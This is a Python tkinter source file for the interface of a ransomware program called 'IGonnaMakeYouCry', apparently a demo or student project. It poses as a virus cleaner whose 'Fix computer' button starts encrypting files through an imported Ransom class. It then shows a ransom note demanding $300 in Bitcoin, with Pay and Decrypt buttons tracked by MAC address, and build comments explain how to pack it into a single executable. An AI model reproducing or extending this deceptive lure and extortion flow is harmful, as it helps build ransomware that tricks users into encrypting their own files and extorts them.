from tkinter import *
from tkinter import messagebox
from ransom import Ransom
from KeyManager import KeyManager
from uuid import getnode as get_mac
from PIL import Image, ImageTk
import time
from os import path
import sys

#sudo apt-get install python3-tk
#pyinstaller --onefile --hidden-import=tkinter  GUI.py
#pip3 install Pillow

#Only used to find shild image on run time. Because of single executable.
bundle_dir = getattr(sys, '_MEIPASS', path.abspath(path.dirname(__file__)))
path_to_dat = path.join(bundle_dir, 'shield.png')



class GUI:


    def __init__(self):
        """
        Loads "you have a virus" if the computer has not been encrypted
        else loads "your computer has been encrypted".
        """
        self.window = None
        self.keyManager = KeyManager()
        self.ransom = Ransom()


        if(self.keyManager.isEncrypted(get_mac())):
            self.loadEncrypted()
        else:
            self.loadYouHaveVirus()


    def pay(self):
        """
        Is called when "pay" is pressed in UI.
        Calls method in keyManager to pay and shows a dialog.
        """
        self.keyManager.pay(get_mac())
        messagebox.showinfo('Thanks','Thanks you for the payment.')

    def decrypt(self):
        """
        Is called when "decrypt" is pressed in UI.
        If it has been payed, it starts decrypting and shows a dialog when done.
        If it has not been payed it gives a warning that it has not been payed.
        """
        try:
            self.ransom.startDecryption()
            self.keyManager.removeThisMacFromDB() #So it is possible to run the application multiple times.
            messagebox.showinfo('Decrypted','Everything has been decrypted.')
            sys.exit()
        except Exception as error:
            print(error)
            messagebox.showwarning('Pay!','You have not payed.')
        


    def encrypt(self):
        """
        Is called when "fix computer" is pressed in UI.
        Calles method in ransom to start encryption.
        Changes UI with text to indicate that the program is working.
        """
        lbl = Label(self.window, text="Cleaning, please wait...", font=('Helvetica 12 bold', 15))
        lbl.grid(column=0, row=1)
        self.window.update()
        self.ransom.encrypt()
        self.window.destroy()
        self.loadEncrypted()



    def loadEncrypted(self):
        """
        Load  everything has been encrypted.
        """
        self.window = Tk()

        self.window.title("IGonnaMakeYouCry")
        self.window.geometry('500x400')
        self.window.configure(background = 'firebrick')

        lbl = Label(self.window, text="Woops, looks like you are in trouble!", bg = 'gold', fg = 'black', font='Helvetica 12 bold')
        Grid.columnconfigure(self.window, 0, weight=1)
        Grid.columnconfigure(self.window, 1, weight=1)
        lbl.grid(row=0,column = 0, pady=10, columnspan=2)


        t = Text(self.window,width=60, height=15, bg = 'gold')
        t.tag_configure('bold', font='Helvetica 12 bold')

        t.insert('end', 'What the hell just happened? \n', 'bold')
        t.insert('end', 'Some of your files have been encrypted. \n \n', )
        t.insert('end', 'Can I get my files back? \n', 'bold')
        t.insert('end', 'Yes, but it will cost you. You will need to pay 300$ worth of Bitcoins in order to decrypt your files. Once you have payed you need to press the "Decrypt" button and your files will be decrypted. \n \n', )
        t.insert('end', 'How do I pay? \n', 'bold')
        t.insert('end', 'Simple, just press the pay button down below.', )
        t.configure(state='disabled')
        t.grid(row=1,column = 0, pady=10, columnspan=2)


        btn1 = Button(self.window, text="Pay", command=self.pay, bg = 'gold', fg = 'black',font='Helvetica 12 bold')
        btn1.grid(row=2,column = 0, pady=10)

        btn2 = Button(self.window, text="Decrypt", command=self.decrypt, bg = 'gold', fg = 'black', font='Helvetica 12 bold')
        btn2.grid(row=2,column = 1, pady=10)

        self.window.mainloop()


    def loadYouHaveVirus(self):
        """
        Load you have a virus UI.
        """

        self.window = Tk()

        self.window.title("Virus Detected")
        self.window.geometry('400x330')
        self.window.configure(background = 'lightskyblue')
        

        lbl = Label(self.window, text="Looks like your computer is infected.\n Run this program to get rid of the virus.", font='Helvetica 12 bold')
        Grid.columnconfigure(self.window, 0, weight=1)
        lbl.grid(row=0,column = 0, pady=10)

        img = Image.open(path_to_dat)
        render = ImageTk.PhotoImage(img)
        img = Label(self.window, image=render)
        img.image = render
        img.grid(row = 1, column = 0)
    

        btn = Button(self.window, text="Fix computer", command=self.encrypt, font='Helvetica 12 bold')
        btn.grid(row=2, column = 0, pady=10)

        self.window.mainloop()


gui = GUI()
